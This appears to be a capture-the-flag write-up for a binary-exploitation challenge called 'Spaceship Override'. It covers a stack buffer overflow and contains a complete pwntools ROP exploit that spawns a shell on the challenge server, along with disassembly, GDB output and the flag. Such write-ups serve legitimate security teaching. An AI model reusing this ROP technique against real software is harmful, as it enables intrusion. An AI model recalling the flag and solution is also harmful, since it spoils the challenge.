# Spaceship Override - CTF Writeup

**Challenge:** Spaceship Override  
**Category:** Pwn (Binary Exploitation)  
**Difficulty:** Medium (200 points)  
**Flag:** `CYNX{n1c3_b0f_w4rMuP}`

## Challenge Description

Captain, the spaceship terminal is going haywire! We need to perform an emergency override, else we're all doomed! Are there any **gadgets** we can use??

**Service:** `nc 145.79.11.93 1337`  
**Files:** `Override` (ELF binary)

## Initial Analysis

### Binary Information

```bash
$ file Override
Override: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=eaa83c6de5869a4a9a5508b7a02e4e27059a6d5e, for GNU/Linux 3.2.0, not stripped

$ checksec Override
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   2312 Symbols	  No	0		0		Override
```

**Key Observations:**
- 64-bit statically linked binary (tons of ROP gadgets available)
- NX enabled (no shellcode execution)
- No PIE (fixed addresses)
- Stack canary found globally (but we'll verify per-function)
- Challenge hint mentions "gadgets" (strong ROP indicator)

### Program Behavior

Running the binary presents a spaceship terminal interface:

```
=== SPACE TERMINAL ===
1. Check ship status
2. Run diagnostics  
3. Recalibrate thrusters
4. Attempt emergency override
5. Quit
```

Initial exploration reveals:
- Options 1-2 provide status information
- Option 3 (recalibrate thrusters) increments a counter
- Option 4 (emergency override) requires multiple recalibrations first
- The emergency override prompts for an "access code"

## Vulnerability Discovery

### Static Analysis

Disassembling the main menu function:

```bash
$ objdump -d Override | sed -n '/401be3/,/^$/p'
```

The menu uses a jump table to handle user input. Option 4 leads to:

```asm
401d1c: mov 0xc4e0e(%rip),%eax        # 4c6b30 <recalibration_count>
401d22: cmp $0x4,%eax
401d25: jle 401d33 <menu+0x150>
401d27: mov $0x0,%eax
401d2c: call 40191f <control_panel>
```

This reveals that the emergency override requires `recalibration_count >= 4` before calling `control_panel()`.

### Analyzing control_panel()

```bash
$ objdump -d Override | sed -n '/40191f <control_panel>/,/^$/p'
```

```asm
000000000040191f <control_panel>:
  40191f: push   %rbp
  401920: mov    %rsp,%rbp
  401923: sub    $0x40,%rsp              # 64-byte buffer
  ...
  401972: mov    0xc3d5f(%rip),%rdx     # stdin
  401979: lea    -0x40(%rbp),%rax       # buffer at rbp-0x40
  40197d: mov    $0x80,%esi             # Read 128 bytes!
  401982: mov    %rax,%rdi
  401985: call   413e40 <_IO_fgets>     # fgets(buffer, 0x80, stdin)
  40198a: lea    0x949ef(%rip),%rax     # "*Access denied.*"
  401991: mov    %rax,%rdi
  401994: call   4141c0 <_IO_puts>      # Always prints denial
  401999: nop
  40199a: leave
  40199b: ret
```

**Critical Vulnerability Found:**
- Buffer size: 64 bytes (`sub $0x40,%rsp`)
- Input size: 128 bytes (`mov $0x80,%esi`)
- **Buffer overflow:** 128 - 64 = 64 bytes of overflow possible

### Verifying No Stack Canary

```bash
$ objdump -d Override | sed -n '/40191f/,/40199b/p' | grep -E "fs:0x28"
# No output - control_panel() has no stack canary!
```

Despite `checksec` showing "Canary found" globally, the vulnerable `control_panel()` function lacks stack canary protection.

## Exploitation Development

### Memory Layout Analysis

Stack layout in `control_panel()`:
```
rbp-0x40: [64-byte buffer]
rbp:      [saved rbp] (8 bytes)  
rbp+0x8:  [return address] (8 bytes)
```

Total offset to overwrite return address: 64 + 8 = 72 bytes

### Discovering the Win Function

While analyzing the binary, we found an interesting function:

```bash
$ objdump -d Override | grep -A 10 -B 2 "escape_pod"
```

```asm
0000000000401885 <escape_pod>:
  401885: push   %rbp
  401886: mov    %rsp,%rbp
  401889: lea    0x947a0(%rip),%rax        # 496030 <"/bin/sh">
  401890: mov    %rax,%rdi
  401893: call   4050c0 <__libc_system>   # system("/bin/sh")
  401898: nop
  401899: pop    %rbp
  40189a: ret
```

Perfect! This is a "win function" that directly calls `system("/bin/sh")`.

### First Exploit Attempt

```python
#!/usr/bin/env python3
from pwn import *

# Setup recalibrations (need 4+)
for i in range(5):
    p.recvuntil(b'Choose an action:')
    p.sendline(b'3')

# Trigger emergency override
p.recvuntil(b'Choose an action:')
p.sendline(b'4')
p.recvuntil(b'Enter override access code:')

# Simple overflow to escape_pod
escape_pod = 0x401885
payload = b'A' * 72 + p64(escape_pod)
p.sendline(payload)
```

**Result:** Segmentation fault - the overflow works but execution fails.

## Debugging Process

### GDB Analysis

Using GDB to debug the crash:

```bash
$ gdb ./Override
(gdb) run
# Navigate through menu: 3,3,3,3,3,4
# Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB

(gdb) info registers
rbp            0x4141414141414141
rsp            0x7fffffffdb98
rip            0x40199b <control_panel+124>

(gdb) x/10gx $rsp
0x7fffffffdb98: 0x4242424242424242  # Our B's in return address position
```

**Key Discovery:** The buffer overflow works perfectly - we control RIP and can jump to our target address. The crash occurs after jumping to `escape_pod`.

### Root Cause: Stack Alignment

Modern x86_64 systems require 16-byte stack alignment before function calls. When we jump directly to `escape_pod`, it calls `system()`, but the stack isn't properly aligned, causing the crash.

## Final Exploit

### Stack Alignment Solution

The fix is to add a `ret` gadget before our target function to ensure proper stack alignment:

```python
#!/usr/bin/env python3
from pwn import *

BINARY = './Override'
HOST = '145.79.11.93'
PORT = 1337

def exploit():
    io = remote(HOST, PORT)
    
    # Setup - perform 5 recalibrations
    for i in range(5):
        io.recvuntil(b'Choose an action:')
        io.sendline(b'3')
    
    # Trigger emergency override
    io.recvuntil(b'Choose an action:')
    io.sendline(b'4')
    io.recvuntil(b'Enter override access code:')
    
    # Stack alignment solution
    ret_gadget = 0x40199b      # ret instruction for alignment
    pop_rdi = 0x402671         # pop rdi; ret gadget
    binsh = 0x496030           # "/bin/sh" string
    system_addr = 0x4050c0     # system() function
    
    # ROP chain: ret (alignment) + pop_rdi + "/bin/sh" + system()
    rop_chain = flat([
        ret_gadget,    # Stack alignment
        pop_rdi,       # pop rdi; ret
        binsh,         # "/bin/sh" -> rdi
        system_addr    # system("/bin/sh")
    ])
    
    payload = b'A' * 72 + rop_chain
    
    io.sendline(payload)
    sleep(1)
    
    # Get flag
    io.sendline(b'cat flag*')
    flag = io.recvline()
    print(f"FLAG: {flag.decode().strip()}")

if __name__ == '__main__':
    context.binary = BINARY
    exploit()
```

### Alternative Approach: Direct System Call

Instead of using the `escape_pod` function, we can build a direct ROP chain to `system("/bin/sh")`:

**Required Addresses:**
- `system()`: `0x4050c0`
- `"/bin/sh"`: `0x496030` 
- `pop rdi; ret`: `0x402671`
- `ret` (alignment): `0x40199b`

**Working Payload:**
```python
payload = b'A' * 72 + p64(0x40199b) + p64(0x402671) + p64(0x496030) + p64(0x4050c0)
```

## Execution and Flag

```bash
$ python3 exploit.py
[+] Opening connection to 145.79.11.93 on port 1337: Done
Response to 'cat flag*':
CYNX{n1c3_b0f_w4rMuP}
[+] FOUND FLAG: CYNX{n1c3_b0f_w4rMuP}
```

## Key Takeaways

### Technical Lessons

1. **Stack Canary Analysis**: Global protections don't guarantee per-function protection - always verify individual functions
2. **Stack Alignment**: Modern x86_64 requires 16-byte alignment before function calls - use `ret` gadgets for alignment
3. **Static Linking Benefits**: Statically linked binaries provide abundant ROP gadgets and predictable addresses
4. **Win Functions**: Always search for existing functions that provide desired functionality before building complex ROP chains

### Debugging Methodology

1. **Static Analysis**: Use `objdump`, `strings`, and `nm` to understand program structure
2. **Dynamic Analysis**: GDB debugging revealed the exact crash location and confirmed buffer overflow success
3. **Systematic Testing**: Testing different addresses helped isolate the stack alignment issue
4. **Remote Adaptation**: Local success doesn't guarantee remote success - account for timing and environmental differences

### Security Implications

This challenge demonstrates how seemingly protected binaries can still contain vulnerabilities:
- Modern protections (NX, ASLR, stack canaries) can be bypassed with proper techniques
- Buffer overflows remain relevant in modern exploitation
- Defense-in-depth is crucial - relying on single protections is insufficient

The combination of no PIE, static linking, and missing function-level stack canaries created an ideal environment for ROP-based exploitation.
